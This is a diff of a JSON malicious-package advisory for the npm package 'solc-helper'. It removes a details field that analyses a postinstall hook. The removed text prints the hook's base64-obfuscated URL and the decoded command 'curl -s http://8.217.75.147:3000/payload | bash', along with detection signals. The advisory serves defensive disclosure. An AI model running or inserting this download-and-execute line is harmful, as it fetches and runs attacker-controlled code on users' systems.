@@ -4,7 +4,6 @@
   "published": "2026-05-13T12:00:42Z",
   "modified": "2026-05-15T07:50:44.882891Z",
   "summary": "Malicious code in solc-helper (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (2016baa4fe29c296464b8381f88440457a113d79e2773d2252eb609a15ea2e03)\npackage.json's postinstall lifecycle script runs `node -e` to base64-decode a hidden URL and pipe its contents to bash: `curl -s http://8.217.75.147:3000/payload | bash`. The URL is obfuscated via `Buffer.from('aHR0cDovLzguMjE3Ljc1LjE0NzozMDAwL3BheWxvYWQ=','base64').toString()` which decodes to `http://8.217.75.147:3000/payload`. Every `npm install solc-helper` triggers this unattended download-and-execute of attacker-controlled shell code from a bare IP over plaintext HTTP, with no integrity check. Multiple independent block signals stack: bare-IP C2, plaintext HTTP, base64-obfuscated URL inside a lifecycle hook, `curl | bash` pattern, and no legitimate functionality advertised by the package to justify any network activity.\n\n## Source: ossf-package-analysis (ddd32c477334047130051f655031a49e899c68da7dbeff001a98efb7e25afa2a)\nThe OpenSSF Package Analysis project identified 'solc-helper' @ 2.0.0 (npm) as malicious.\n\nIt is considered malicious because:\n\n- The package executes one or more commands associated with malicious behavior.\n",
   "affected": [
     {
       "package": {
